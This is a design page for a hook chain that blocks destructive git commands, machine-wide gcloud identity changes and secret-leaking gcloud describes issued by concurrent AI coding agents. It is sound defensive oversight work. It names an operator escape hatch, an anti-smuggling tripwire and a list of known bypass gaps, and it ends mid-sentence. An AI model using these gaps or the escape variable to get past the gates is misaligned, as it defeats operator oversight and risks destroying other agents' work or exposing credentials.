# The PreToolUse Bash Gate Chain

**Module:** `~/.claude/hooks/pretooluse_bash.py` (dispatcher) plus the gate modules it imports:
`block_branch_ops.py`, `block_head_overwrite.py`, `block_gcloud_identity.py`, `block_unscoped_commit.py`,
`check_staged_scope.py`, `precommit_review_gate.py`, `file_claims.py`, `gh_issue_close_gate.py`,
`protected_board_guard.py`, `churn_tracker.py`, the never-blocking `issue_create_observer.py`, and the shared
library `_lib.py`. Gate 3c lives inside `pretooluse_bash.py` itself.

## The rule

Every Bash command goes to one `PreToolUse` hook, `hooks/bash_gate.sh`. That shell shim is a fast
path: it exits at once, without starting Python, for a command that matches none of its patterns,
and `CSA_DISABLE_HOOKS=1` skips the whole chain. Any command a gate could act on is handed to one
dispatcher, `hooks/pretooluse_bash.py`, before it executes. The dispatcher runs a fixed list of
gates in a fixed order, and the first gate that says "block" wins. The gates deny the operations
this runtime reserves for the human operator or makes conditional:

- destructive git state changes (`checkout`, `stash`, `reset`, `rebase`, `restore`, `clean`), branch
  deletion and bulk staging (gates 1 and 2);
- a historical git blob redirected over its own path (gate 1b);
- gcloud identity changes, unmasked describe/list output of secret-bearing resources, and
  `--log-http` (gate 1c);
- a commit that does not name its own paths, uses a bulk pathspec, or sweeps past the file-count and
  top-directory limits (gate 3);
- a commit whose exact content has no recorded review (gate 3b);
- a pathspec commit while `.pre-commit-config.yaml` has uncommitted edits, which pre-commit would
  fail anyway (gate 3c);
- a commit that contends with another live agent's claim (gate 4);
- an issue close that cites a commit that does not exist or has not reached the environment the
  close claims (gate 5);
- adding an item to a protected project board (gate 5b).

Four properties hold across the whole chain:

- **Eleven gates, ten that can block.** The gates are 1, 1b, 1c, 2, 3, 3b, 3c, 4, 5, 5b and 6. Gate
  6 (`churn_tracker`) is a pure observer. A separate observer, `issue_create_observer`, runs on
  every command that reaches the dispatcher; it is not one of the eleven and can never block.
- **Enforcement is a switch.** A gate denies only when enforcement is on (see "Enforcement-state
  mechanics: `enforcing()`"). Otherwise it records what it would have denied and lets the command
  through.
- **Failure is open by default.** A crashing or confused gate allows the command, because a broken
  safety hook must never be worse than no hook. A short, named list of cases fails closed instead
  (see "Fail-closed vs. fail-open").
- **Escape hatches are narrow.** Only gates 1, 1b, 1c and 2 can be overridden, with one environment
  variable set in the hook's own process and never in the command text. Every other gate has at most
  its own rollback lever.

The rest of this page is the mechanics, gate by gate. The main dated corrections and fix-round
narratives are collected, word for word, in the History section at the end. Short provenance tags (a
date, an issue number or a fix-round label beside the rule it explains) stay inline.

## The problem this solves

This runtime routinely runs many Claude Code agents/sessions against the *same* git working
tree at once (see `CLAUDE.md` §2: "Assume other agents are editing the tree — right now"). Left
alone, an LLM agent can and will:

- Run a destructive git state-mutation (`checkout`, `reset --hard`, `stash`) that wipes another
  agent's uncommitted work, because it misjudged unfamiliar files as unrelated debris rather than
  a peer's in-flight edit.
- `git add -A` / `git commit -a` and sweep up files it never meant to touch, landing someone
  else's unrelated, half-finished edit in its own commit.
- Commit a large, unscoped diff that's impossible to review or revert independently.
- Land a commit nobody has actually reviewed, because "I'll review it after" quietly never
  happens under time pressure.
- Close a GitHub issue with a fabricated "fixed by \<sha\>" claim, or claim a fix "deployed to
  prod" when it only reached staging.

`bash_gate.sh` is the single `PreToolUse:Bash` hook registered in `settings.json`. It hands any
command a gate could act on to one Python dispatcher, `pretooluse_bash.py`, which mechanically blocks
(or, in log-only mode, just logs) the operations this runtime has decided are reserved for the human
operator or must satisfy specific preconditions first. The dispatcher replaced three separately-spawned
bash guards with one Python process that reads the hook event once and runs each gate's pure decision
function in a fixed order — cutting the
per-Bash-call overhead from three interpreter spawns (~135ms) to one (per the `pretooluse_bash.py` module docstring).

## Architecture: fast path, dispatcher, shared library

- `bash_gate.sh` is a cheap shell fast-path: a Bash command that matches none of its patterns
  costs essentially nothing — the Python dispatcher isn't even spawned, and `CSA_DISABLE_HOOKS=1` makes both
  `settings.json`'s command and `bash_gate.sh` exit before anything else runs. The patterns are `git`,
  `gcloud`, the literal inline escape-variable name, and narrow arms for `gh issue close`, `gh issue create`
  (which also covers `gh_issue.sh create`) and the protected-board-add shapes; the header of `bash_gate.sh`
  explains each arm and `hooks/tests/test_bash_gate_patterns.sh` pins the set.
- `pretooluse_bash.py` is the actual dispatcher. It reads the hook JSON payload from stdin once
  (`_lib.read_event()`), then calls each gate's **pure** decision function in order, short-
  circuiting on the first block (`resolve_block()` in `pretooluse_bash.py`).
- `_lib.py` is the shared, dependency-free library every hook module imports: JSON event
  parsing, the `enforcing()` resolver, the canonical deny-object emitter, the append-only
  `~/.claude/.enforcement/log.jsonl` logger, and the git command tokenizer
  (`git_segments()`/`_split_segments()`/`_strip_git_globals()`) that every gate below builds its
  decision on (see the `_lib.py` module docstring).

Every gate module exposes a **pure decision function** — no I/O, no env reads, easily unit
tested — plus a thin `main()` that resolves environment policy (log-only vs. enforcing,
escape hatch, master-off) and emits/logs the result. `pretooluse_bash.py` calls the pure
decision functions directly rather than shelling out to each module's own `main()`, which is
what makes the single-spawn consolidation possible.

## The gate order (first block wins)

The dispatcher's own module docstring is authoritative (see its "GATE ORDER" block); it currently
runs **eleven** gates in this order. Ten of them can block (1, 1b, 1c, 2, 3, 3b, 3c, 4, 5, 5b);
`churn_tracker` (gate 6) structurally cannot. `CLAUDE.md` §7 states this same "ten blocking +
churn_tracker = eleven" count. A separate, unconditional, never-blocking OBSERVER call
(`issue_create_observer`, below the table) also runs on every `resolve_block()` invocation, besides
those eleven; it is not part of this "first block wins" ordering at all, since it can never
contribute a block. See its own section after Gate 6.

| # | Gate | Module | Fires on | Escapable? |
|---|------|--------|----------|------------|
| 1 | `block_branch_ops` | `block_branch_ops.py` | any Bash command | yes (git-state escape hatch) |
| 1b | `block_head_overwrite` | `block_head_overwrite.py` | any Bash command | yes (git-state escape hatch) |
| 1c | `block_gcloud_identity` | `block_gcloud_identity.py` | any Bash command (gcloud identity mutation OR an unmasked scheduler/run/functions describe/list OR --log-http) | yes (git-state escape hatch, reused) |
| 2 | `block_unscoped_commit` | `block_unscoped_commit.py` | any Bash command | yes (git-state escape hatch) |
| 3 | `check_staged_scope` | `check_staged_scope.py` | a writing `git commit` | no |
| 3b | `precommit_review_gate` | `precommit_review_gate.py` | a writing `git commit` | no (own rollback lever only) |
| 3c | `dirty_precommit_config` | inside `pretooluse_bash.py` | a *pathspec* `git commit` | no (own rollback lever only) |
| 4 | `file_claims` | `file_claims.py` | a writing `git commit` | no |
| 5 | `gh_issue_close_gate` | `gh_issue_close_gate.py` | `gh issue close ...` | no |
| 5b | `protected_board_guard` | `protected_board_guard.py` | an attempt to ADD an item to a protected GitHub Projects (v2) board | no |
| 6 | `churn_tracker` | `churn_tracker.py` | a writing `git commit` (only reached if nothing above blocked) | never blocks (pure observer) |

### Gate 1 — `block_branch_ops`: forbidden state-mutating verbs

**File:** `hooks/block_branch_ops.py`. **Pure core:** `decision(command) -> (block, reason)`.

Blocks the git subcommands that can destroy another agent's uncommitted work or rewrite branch
state, none of which an autonomous agent should ever need:

- **State verbs** (`STATE_VERBS` in `block_branch_ops.py`): `checkout`, `switch`, `stash`,
  `reset`, `rebase`, `worktree`, `restore`, `clean`.
  - `worktree` and `restore` are **narrower carve-outs**, not blanket-blocked (added
    2026-08-28): `git worktree list/prune/repair` are allowed (never-mutating or safe recovery;
    `add`/`remove`/`move` stay blocked) (the `worktree` branch of `_evaluate_git_argv()` in `block_branch_ops.py`), and
    `git restore --staged`/`-S` with no `--worktree`/`-W` flag is allowed because it only
    rewrites the *index*, never the working tree — the working-tree form of `restore` is the
    modern spelling of the already-blocked `checkout --` and stays blocked
    (the `restore` branch of `_evaluate_git_argv()`).
- `git branch -d`/`-D`/`--delete` (branch deletion).
- `git add -A`/`--all`/`-u`/`--update`/`.`/`:/'` (bulk staging, including combined short flags
  like `-Au`).
- `git commit -a`/`-am`/`--all` (auto-stage-all commit).

**Why `restore`/`clean` are blocked at all (2026-08-28 addition):** `CLAUDE.md` §2 documents a
real incident the same night these were added — three concurrent interactive sessions sharing
one tree repeatedly clobbered each other's uncommitted work, once through an agent misjudging a
peer's legitimate in-progress edit as unmarked foreign drift. `restore` (working-tree form) and
`clean` are, respectively, the modern spelling of `checkout --` and an outright deletion of
untracked files — both destructive in exactly that way, and neither had been in `STATE_VERBS`
before. The comment in the module is explicit that this closes *one* path in that class, not the
whole class: `git rm -f`, `checkout-index -f`, `sparse-checkout set`, and `apply -R` remain
unblocked (module docstring of `block_branch_ops.py`).

**Parse-ambiguity fails closed:** if a git segment can't be tokenized (`shlex.split` fails on
unbalanced quoting) but the raw string still contains the word "git", it's treated as a block
candidate rather than silently allowed (`_evaluate_git_argv()` in `block_branch_ops.py`, acting on the `untokenizable` sentinel that `git_segments()` in `_lib.py` emits).

**Escape hatch (shared by gates 1, 1b, 1c and 2):** `CSA_ALLOW_GIT_STATE_OPS=1` set in the *hook's own
process environment* lets a match through — but the literal string `CSA_ALLOW_GIT_STATE_OPS`
appearing anywhere *inside the command text itself* is a block under enforcement
(`inline-escape-var-forbidden`; logged and allowed in log-only mode) that the escape hatch can never rescue, precisely so an agent
can't smuggle its own bypass into a command string (`ESCAPE_VAR` and `decision()` in `block_branch_ops.py`). The hook reads the variable from its own process environment on every call, so while it is set in the
environment Claude Code was launched with it lets through every such block, not one. `CLAUDE.md` §7 calls
it a "deliberate, single-command, operator-scoped" override, which is the intended use: an operator sets it
for one invocation and unsets it. It is not meant as a standing bypass.

### Gate 1b — `block_head_overwrite`: a historical blob redirected over its own path

**File:** `hooks/block_head_overwrite.py`. **Pure core:** `decide(event) -> Decision`.

Blocks one specific destructive shape: `git show <ref>:<path> > <path>`, or `git cat-file -p
<ref>:<path> > <path>` (also with `>>`, `>|` or an fd-qualified redirect), where the redirect
destination resolves to the SAME path the blob was read from. That overwrites the working-tree file
with a historical version and destroys any uncommitted, never-staged work in it; unstaged content
leaves no blob in git, so nothing can recover it. Added 2026-09-05 after a real data-loss incident
(GH #4387).

It is not a `git` subcommand block. `show` and `cat-file` are ordinary reads and are correctly
absent from gate 1's `STATE_VERBS`; the destructive act is the shell redirect. Detection therefore
scans the raw command text with two regexes (`_GIT_SHOW_INVOKE_RE` finds the invocation and its
`<ref>:<path>`, `_REDIRECT_OP_RE` finds every redirect operator after it) instead of reusing the
shared git tokenizer, which treats a bare `|` or `&` as a segment separator and would tear `>|` and
`2>&1` redirects in half.

Deliberately narrow: a redirect to a DIFFERENT path (`git show HEAD:foo.py > foo.py.bak`) is
allowed. Out of scope by design, because each is undecidable from static text: dynamic expansion of
the destination or ref (`$VAR`, `$(...)`, backticks, brace expansion), `eval`/`source`-wrapped
commands, `exec`-scoped redirects, and pipes into writer tools (`| tee`, `| dd of=`, `| sponge`).

The escape hatch and the inline-tripwire are gate 1's (`CSA_ALLOW_GIT_STATE_OPS`; the literal inside
the command text is denied). Unlike gates 1 and 2, parse ambiguity fails OPEN here.

### Gate 1c — `block_gcloud_identity`: forbidden gcloud identity mutations (#5310) + unmasked secret-bearing describes (#5890)

**File:** `hooks/block_gcloud_identity.py`. **Pure core:** `decision(command) -> (block, reason)`
(same shape as gate 1's `block_branch_ops.decision()`).

Added 2026-09-13. `gcloud config`/`gcloud auth`'s active account and
`~/.config/gcloud/application_default_credentials.json` (ADC) are **machine-wide** state — exactly
one of each on the machine, shared by every concurrently-running agent session — the identical
hazard shape gate 1 already protects for the shared git working tree. An agent that mutates either
silently re-identifies every *other* live session's next `gcloud`/ADC-consuming call, with no
per-session isolation.

Blocks, unconditionally (none of these carries a per-command scoping form that leaves the ambient
identity untouched):

- `gcloud config set account <val>` / `gcloud config set core/account <val>` (`account` and
  `core/account` name the same property).
- `gcloud config configurations activate <name>` (switches the active named configuration, whose
  properties include `account`).
- `gcloud auth activate-service-account ...` — gcloud's own `--help` documents activation here as
  unconditional ("Credentials will also be activated... similar to running gcloud config set
  account"), so there is no flag that scopes this to one invocation; denied outright rather than
  gated on a flag that doesn't exist.
- `gcloud auth application-default login ...` — overwrites the shared ADC file at its well-known
  location; no scoping flag suppresses this.
- `gcloud auth login ...` **without** `--no-activate` — a bare `gcloud auth login` sets the active
  account exactly like `config set account` would; `--no-activate` is gcloud's own documented way
  to authorize without becoming the ambient identity, so its presence is what allows the command
  through.
- `gcloud auth login ... --update-adc` **regardless of `--no-activate`** — `--update-adc` writes
  the shared ADC file (gcloud's own `--help`: "Any credentials previously generated by gcloud auth
  application-default login will be overwritten"), the exact mutation `auth-application-default-
  login` above already blocks outright, reachable via a second verb; `--no-activate` only
  suppresses the active-account change, never the ADC write, so it does not authorize this flag.
- `gcloud config configurations create <name>` **without** `--no-activate` — gcloud activates a
  freshly created configuration by default (its own `--help`: "--activate ... Enabled by default,
  use --no-activate to disable"), the same active-configuration switch `config configurations
  activate` above already blocks, reachable via `create`.
- `gcloud config unset account <val>` / `gcloud config unset core/account <val>` — reaches the
  identical mutation `config set account` performs, by **deletion** instead of assignment (gcloud's
  own `--help`: "By default, unsets the property in your active configuration only" — the same
  active-configuration scope `set` mutates).
- `gcloud auth revoke [ACCOUNTS...] [--all]` — with no account given, gcloud's own `--help`: "If no
  account is specified, this command revokes credentials for the currently active account,
  effectively logging out of that account" — the same re-identification `config set account`
  performs, reached by deleting the credential instead of reassigning it. With an explicit account
  or `--all`, it still removes that account's locally-cached credential from the shared credential
  store outright, with no scoping flag limiting the removal to the caller's own session; denied
  unconditionally, mirroring `auth-activate-service-account`'s identical "no scoping flag exists"
  posture.
- `gcloud auth application-default revoke` — deletes the shared ADC file outright (gcloud's own
  `--help`: "deletes the local credential file"), the same well-known machine-wide path
  `auth-application-default-login` is blocked for overwriting, now reached by deletion; no scoping
  flag exists.
- Every verb above **also under an `alpha`/`beta` release-track prefix** (`gcloud alpha config set
  account ...`, `gcloud beta auth login`, ...) — gcloud exposes the identical command surface one
  path element later under either track (verified against the real installed CLI: `gcloud alpha
  config set --help` / `gcloud beta auth login --help` both resolve to the same command as their
  non-prefixed form). A leading `alpha`/`beta` path element is stripped before every verb match, so
  the track prefix can never mask a blocked verb.
- A shell redirect/`cp`/`mv`/`tee` that writes
  `~/.config/gcloud/application_default_credentials.json` directly — the same class of
  filesystem-level bypass gate 1b already treats as equally real and equally dangerous as the
  git-native verb it parallels. This includes the directory-destination form with **or without** a
  trailing slash (`cp SRC ~/.config/gcloud/` and `cp SRC ~/.config/gcloud` both keep the source's
  own `application_default_credentials.json` basename at the destination) whenever the
  destination's own basename carries no `.`-extension (distinguishing an existing-directory
  destination from a genuine renamed-file destination).

Allows the sanctioned per-invocation scoping forms #5310 asks every session to use instead:
`gcloud --account=<val> <cmd>` (any position), `--impersonate-service-account=<val>`,
`CLOUDSDK_CORE_ACCOUNT=<val> gcloud <cmd>` (a per-process env override), `gcloud auth list`, and
`gcloud config get-value account` — plus every other read-only/non-identity gcloud subcommand.

**Also blocks unmasked secret-bearing describes (issue #5890).** A default `gcloud
scheduler jobs describe` prints the job's full representation to stdout, including
`httpTarget.headers` VERBATIM. A header value such as `X-Scheduler-Key` is the secret itself, and
stdout is tool output the model reads. `run services describe`, `run jobs describe`, `run revisions
describe`, `run jobs executions describe`, `run jobs executions tasks describe` (env vars), `run
worker-pools describe`, `run worker-pools revisions describe`, `run configurations describe` (round
4 — the last three), `functions describe`, and `functions deploy` (round 4 — a mutating verb sharing
the same unmasked-full-dump default) all have the same shape.

So gate 1c also denies these `describe` verbs (and their `list` counterparts) unless the command
carries a field-PROJECTION `--format` -- `yaml(...)`, `json(...)`, `table(...)`, `value(...)` or
`csv(...)` -- whose field list is non-empty and where EVERY field is an exact, case-insensitive
match against a per-resource-family ALLOWLIST of known-safe leaf fields (round 2: a fail-closed
allowlist, not a substring blocklist -- a parent key like `httpTarget` or `spec` is denied even
though its own name contains no unsafe-looking substring, since gcloud prints that key's entire
subtree). **The `run-service` family also allows three exact Cloud Run networking annotation
leaves (#5936 item 2, 2026-09-27):
`spec.template.metadata.annotations."run.googleapis.com/vpc-access-connector"`,
`..."run.googleapis.com/vpc-access-egress"` and `metadata.annotations."run.googleapis.com/ingress"`.
These are non-secret routing values that the infrastructure work (WS13a/13b) reads. A quoted key
must match exactly, case included (gcloud matches quoted keys case-sensitively, so a case variant
names a different annotation); the parent `annotations` map and every other annotation key stay
denied.** Each of these is denied:
- no `--format` (`describe-unmasked-format`);
- a bare `--format=yaml`, `json` or `text` (`describe-unmasked-format`/`list-unmasked-format`);
- a projection naming a `.`/`*` wildcard, an empty field, or any field outside that family's
  allowlist -- including a parent key, e.g. `yaml(httpTarget)` or `yaml(spec)`
  (`describe-unmasked-format`/`list-unmasked-format`);
- `--flags-file` on a covered verb (`describe-flags-file`/`list-flags-file` -- a flags file can set
  `--format` unsafely with no `--format` token visible in the command this gate ever sees);
- 2+ `--format` tokens (`describe-multiple-format`/`list-multiple-format` -- gcloud applies the LAST
  one per argparse's own last-repeated-flag-wins behavior, and a single value can itself concatenate
  more than one projection -- this gate denies outright rather than trusting a parse of just one
  token).

The matching `list` verbs are allowed with no `--format` (their default table is a summary) or a
safe allowlisted projection; an explicit unsafe projection OR full-dump `--format` is denied the
same way as `describe` (`list-unmasked-format` -- not only a bare full-dump kind).

Separately, **`--log-http`** (when it resolves TRUTHY; the mitigation forms
`--log-http=false`/`=no`/`=0`/`--no-log-http` are explicitly ALLOWED) or **`CLOUDSDK_CORE_LOG_HTTP`
set ANYWHERE in the command** (`log-http-leaks-response`; a raw-text match across the whole command,
since `export CLOUDSDK_CORE_LOG_HTTP=1; gcloud ...` / `env CLOUDSDK_CORE_LOG_HTTP=1 gcloud ...`
reach the identical property from a DIFFERENT shell segment than the gcloud call) is denied on EVERY
gcloud verb this module evaluates, not only the scheduler/run/functions family -- it prints the full
HTTP response body to stderr regardless of `--format`, so a safe-looking masked format alongside
`--log-http` is still a leak. Also denied: **`gcloud config set log_http`/`core/log_http`**
(`config-set-log-http`; the PERSISTENT, machine-wide route to the identical leak, since this writes
the property into the active named configuration rather than scoping to one invocation. Its deny
message explains this persistent, machine-wide RESPONSE-LEAK mechanism rather than the
"re-identifies every peer session" phrasing of the identity-mutation reasons, because it is a
different hazard class even though both are machine-wide). Known remaining gap: a direct write of
`log_http` into `~/.config/gcloud/configurations/config_<name>` bypassing the `gcloud` CLI has no
argv shape for this gate to inspect.

The safe form to reach for is PER RESOURCE FAMILY, e.g. `gcloud scheduler jobs describe <job>
--format='table(name,schedule,state)'` for scheduler jobs, or `gcloud run services describe <svc>
--format='table(metadata.name,status.url)'` for Cloud Run services. The hint in a deny message is
built from the family of the segment that actually blocked (not a fixed scheduler example, and not
merely the first segment naming a covered verb), and the dispatcher passes the command through to
`_message_for` so an agent that follows the hint is not denied again. The module docstring and
`knowledge/gcloud_identity_is_machine_wide.md` carry the full per-family spec.

**Current coverage and limits (the settled result of the fix rounds recorded in History):**

- **Covered verb groups.** `_DESCRIBE_VERB_GROUPS` and `_LIST_VERB_GROUPS` in
  `block_gcloud_identity.py` are the authority: `scheduler jobs`, `run services`, `run jobs`, `run
  revisions`, `run jobs executions` (and `... tasks`), `run worker-pools` (and `... revisions`) and
  `functions` for both `describe` and `list`; `run configurations describe`; and `functions deploy`,
  a mutating verb that shares `describe`'s unmasked full-dump default. Each verb maps to a family in
  `_SAFE_LEAF_FIELDS` (`scheduler-job`, `run-service`, `run-job`, `run-revision`, `run-execution`,
  `function`, `run-worker-pool`), and a projection is safe only if every field is an exact match for
  that family.
- **Program-token match.** A segment counts as a gcloud call only when a program token (bare or
  path-suffixed, after any leading env assignments and `env`/`sudo`/`command`/`exec` wrappers) is
  `gcloud`. A command that merely names the module, a file called `gcloud.log` or a `pytest -k`
  selector is not a gcloud call. A segment that fails to tokenize and mentions the word falls back
  to a whole-word match, fail CLOSED.
- **Nested text.** `bash -c`, `eval`, here-strings, heredocs fed to a shell interpreter, `$(...)`
  and backtick spans are re-evaluated recursively, capped at depth 6
  (`_MAX_NESTED_EXTRACTION_DEPTH`). Every gcloud-shaped token in an argv is evaluated, and a
  truncated slice list denies rather than trusting a partial scan. Single-quoted spans and
  quoted-delimiter heredoc bodies that are not fed to an interpreter are skipped before scanning (an
  unterminated quote skips nothing, failing closed), so this runtime's own `gh issue comment --body
  "$(cat <<'EOF' ... EOF)"` idiom is not denied.
- **Group-level flags.** A flag such as `--region` before the verb on a `run` command cannot hide
  the verb path. A path that cannot be enumerated safely (too many unrecognized flags on a covered
  `run` describe/list) fails closed as `run-path-too-ambiguous`; the `--flag=value` spelling removes
  the ambiguity. A non-describe/list `run` verb such as `deploy` or `update` is never affected,
  whatever the flag count.
- **Environment and format overrides.** `CLOUDSDK_CORE_LOG_HTTP` and `CLOUDSDK_CORE_FORMAT` deny
  when ANY occurrence in the command is truthy; they are safe only when every occurrence is a
  removal or a falsy assignment. `gcloud config set log_http|core/log_http` and `format|core/format`
  are denied (`config-set-log-http`, `config-set-format`).
- **Known deliberate-attacker gaps, documented rather than chased** because each would need
  executing or parsing arbitrary shell: a runtime-built env var name, `source`-ing a file that sets
  a relevant variable, `CLOUDSDK_CONFIG` pointing at another configuration directory, a direct write
  of `log_http` into a configuration file, piped or process-substituted text, `ssh`, an
  interpreter's own subprocess call, a shell function wrapping gcloud, a program path held in a
  variable, and a quoted-delimiter heredoc fed to `cat` whose output is then fed to `bash -c`
  through command substitution. `knowledge/gcloud_identity_is_machine_wide.md` carries the full gap
  list.

**Detection strategy:** unlike gate 1 (which tokenizes real git subcommand argv via the shared
`_lib.git_segments()` git-specific tokenizer), gcloud has no shared tokenizer in this codebase.
This gate reuses `_lib`'s generic, git-agnostic segment splitter (`_lib._split_segments`) plus a
plain `shlex.split` per segment for the subcommand-argv checks, and — mirroring gate 1b's own
raw-text approach for a shell redirect that is not a git/gcloud invocation at all — scans the raw
command text directly for the ADC-file-write shapes.

**Parse-ambiguity fails closed**, the same posture as gate 1's `untokenizable-segment-with-git`: a
segment that mentions `gcloud` but cannot be tokenized unambiguously is a block candidate
(`untokenizable-segment-with-gcloud`), never silently allowed. `bash_gate.sh`'s bash fast-path
(the layer *before* this dispatcher — see "Architecture" above) was extended in the same change to
add `*gcloud*` to its case pattern; without that, a Bash command mentioning only `gcloud` (no `git`
token) would never even reach `pretooluse_bash.py` and this gate could never fire.

**Escape hatch:** reuses gate 1's exact `CSA_ALLOW_GIT_STATE_OPS` var and inline-tripwire
convention rather than minting a new name — this is the same class of "operator-only machine-state
mutation, meant to be set for exactly one command" override.

### Gate 2 — `block_unscoped_commit`: the add/commit subset, with its own message

**File:** `hooks/block_unscoped_commit.py`. **Pure core:** `decide(event) -> Decision`.

Functionally a subset of gate 1's `add`/`commit` checks (bulk `add`, `commit -a`), kept as its
own module purely so the operator sees a distinct, more actionable message ("stage explicit
paths... commit with: `git commit -m "..." -- <path>`...") rather than gate 1's generic
git-state-mutation text (module docstring of `block_unscoped_commit.py`). Also honors the same escape hatch and
inline tripwire as gate 1.

### Gate 3 — `check_staged_scope`: mandatory path-scoped commits

**File:** `hooks/check_staged_scope.py`. **Pure core:** `decision_for_event()`, built from per-segment helpers
`_decide_missing_pathspec()` / `_decide_with_pathspec()`.

Gates 1/2 catch the bulk *stagers* by reading command tokens. This gate catches what they can't
see: an index that's already polluted by an earlier bulk add, an IDE "stage all" click, or a
stray edit — or, since the "mandatory pathspec" rewrite (2026-08-17, `CLAUDE.md` §3), a commit
with *no* pathspec at all, which used to dodge scoping entirely (module docstring of `check_staged_scope.py`).

Per **writing** `git commit` segment (a `--dry-run` segment writes nothing and is skipped
entirely — `writing_commit_segments()` in `check_staged_scope.py`):

- **No explicit `-- <pathspec>`** → `BLOCK missing-pathspec`, unless one of three exemptions
  applies, all of which still fall through to the same scope/sweep check on the *staged index*:
  1. a merge/cherry-pick/revert/rebase is genuinely in progress (git itself refuses a partial
     commit there, so requiring a pathspec would just break real recovery) — `merge_in_progress()`
     via `_git_path_exists()` on `MERGE_HEAD`/`CHERRY_PICK_HEAD`/`REVERT_HEAD`/`rebase-merge`/
     `rebase-apply` (`_MERGE_STATE_GIT_PATHS` in `check_staged_scope.py`);
  2. `--allow-empty`;
  3. `CSA_NO_REQUIRE_PATHSPEC=1` (operator rollback lever).
- **A bulk pathspec** (`.`, `./`, `..`, `:/`, `:/.`, `*`, or an absolute path whose realpath
  equals the repo root's) → `BLOCK bulk-pathspec`. `git commit -- .` must never become the
  sanctioned workaround for "I don't want to name paths" (`is_bulk_pathspec()` in `check_staged_scope.py`).
- **A real, non-bulk pathspec** → checked against **sweep thresholds only**
  (`_sweep_decide()`, default `DEFAULT_MAX_FILES = 30` and `DEFAULT_MAX_TOP_DIRS = 4`
  in `check_staged_scope.py`) — deliberately **not** checked against the
  conventional-commit scope prefix. The reasoning (the docstring of `_decide_with_pathspec()`): a commit
  that names its own paths after `--` has *already* done the scoping — re-deriving a scope from
  the `-m` message's `feat(voice): ...` prefix and requiring every named path's directory to
  literally contain that word would false-positive-block a completely normal commit that pairs
  code with docs/tests, which `CLAUDE.md` itself mandates.
- **A pathspec-less commit that fell through an exemption** *is* checked against the declared
  scope (from the conventional-commit prefix or `CSA_COMMIT_SCOPE`) as well as the sweep
  thresholds, via `decide()` in `check_staged_scope.py` — this is the one path in the
  module that still trusts a message-derived scope, because there's no real pathspec to trust
  instead.
- A compound command is judged **per writing segment, first violation wins**:
  `git commit -m a -- x && git commit -m b` blocks on the second segment.

This gate has **no escape hatch** (`git_state=False` in the dispatcher's `_Block`, set by `_staged_scope_block()` in `pretooluse_bash.py`) — only its own rollback lever, `CSA_NO_REQUIRE_PATHSPEC=1`.

### Gate 3b — `precommit_review_gate`: review *before* the commit

Covered in depth in `review-ladder.md`; summarized here for gate-order completeness. **File:**
`hooks/precommit_review_gate.py`. Denies a `git commit` whose exact pending content — the digest
of `git diff HEAD -- <the commit's own pathspec>` — has no code review on record, or whose
recorded review reported unresolved blockers (module docstring of `precommit_review_gate.py`). Added 2026-08-19
on explicit operator direction ("it shouldn't run after the commit, it should run before the
commit"), replacing a retired post-commit `Stop` gate. Ordered **before** gate 4 deliberately:
a review-denied commit must never first take the per-repo commit-mutex claim, or it would park
that mutex and stall every other agent's commit in the same repo until the claim's TTL expired
(the 3b entry of the `pretooluse_bash.py` module docstring, and `_precommit_review_block()`).

Fails open on any error (unresolvable repo, unreadable ledger, git error, empty diff). **Three**
denial reasons can **never** be cleared by recording a review: `unresolvable-pathspec` means the
hook literally cannot tell what content the commit would land (an unexpanded `$VAR`, an unquoted
`$(...)`/backtick substitution, a leading `~`) and the only fix is re-issuing the commit with
literal, quoted paths; `pathspec-env-set` (GH #5886; see the `--rekey` subsection below) means one
of `GIT_LITERAL_PATHSPECS`/`GIT_GLOB_PATHSPECS`/`GIT_NOGLOB_PATHSPECS`/`GIT_ICASE_PATHSPECS` is
present in the hook's own process environment, making "this content" ambiguous, and the only fix is
unsetting the variable and re-issuing the commit; `pathspec-outside-repo` (issue #4933) means a
token in the pathspec resolves outside the repository — almost always a shell redirect's argument
riding after the pathspec (`-- a.py 2> /tmp/e.log`) — and the only fix is ending the command at the
pathspec and re-issuing. Rollback lever: `CSA_NO_PRECOMMIT_REVIEW=1`.

**`--rekey` (AA-0064, 2026-09-01):** `record_review.py`'s decision logic here is unchanged — a
new `--rekey <prior-key>` CLI mode carries a prior clean review's outcome forward onto the
CURRENT digest ONLY when a byte-identical (SHA256) reconstruction, over LOSSLESS material, PLUS a
plain-regular-file (`100644`) mode check on every newly-staged path all prove the only real change
since the prior review was staging a previously-untracked file, and ONLY onto a target digest with
no existing record at all (never overwrites, e.g., an unresolved `blockers:N`). An
`unreviewed-commit` denial now also prints this exact `--rekey` command as a hint when a clean
entry already exists for the same `--paths` at a different digest.

**Directory, glob and pathspec-magic entries reconstruct correctly (GH #5886, 2026-09-23).** The
reconstruction lets git decide both halves, with no Python-side pathspec matching: the tracked-diff
half excludes force-untracked files with git's own `:(exclude,literal)<path>` magic, and the
untracked half is `git ls-files --others` UNION the force-untracked set, itself derived from `git
diff --name-status` added paths. The `,literal` modifier is load-bearing: a bare `:(exclude)` is a
glob, so a path whose name contains `*`, `?`, `[` or `\` would also exclude its tracked siblings.

**The safety boundary is five checks together, not one.** A `--rekey` carries a prior clean review
forward only when all of these hold: (1) the reconstruction's SHA256 is byte-identical to the prior
key; (2) every newly staged path has git mode `100644`; (3) the reconstruction hit no lossy
condition (invalid UTF-8 decoded with replacement, the 8 MiB per-file cap `_UNTRACKED_READ_CAP`, the
64 MiB aggregate cap `_UNTRACKED_TOTAL_CAP` or the 2000-entry cap `_UNTRACKED_MAX_FILES`, or an
unreadable file's stat-only rendering), else `rekey-lossy-material`; (4) names with control
characters are rendered unambiguously by `_digest_safe_name`; and (5) the chain root carries the
digest-format marker `dg=2`, else `rekey-root-digest-format-stale`. `review-ladder.md` has the full
`--rekey` mechanism.

**Ambient pathspec variables are refused, never stripped.** If any of `GIT_LITERAL_PATHSPECS`,
`GIT_GLOB_PATHSPECS`, `GIT_NOGLOB_PATHSPECS` or `GIT_ICASE_PATHSPECS` is present in the hook's own
environment, gate 3b denies with `pathspec-env-set` (never clearable by recording a review), and
`record_review.py --pre-commit` and `--rekey` refuse before computing anything. This covers only a
variable already in the hook process's inherited environment. It does NOT cover a variable set by
the gated command itself (an inline `VAR=value` prefix, or an `export`/`env`/`set -a` in the same
shell invocation), because the hook is a separate process that never sees them; nor the git CLI's
own `--literal-pathspecs`-style options; nor `--work-tree`/`--git-dir`. Those remain open and are
tracked on issue #5892. The `--rekey` hint is suppressed for a directory pathspec
(`_any_path_is_a_directory`), because a directory commonly sweeps in files beyond the reviewed set
and the suggested command would likely refuse for an unrelated reason.

`record_review.py --rekey` also refuses, as defense in depth, when the prior entry's own `paths=`
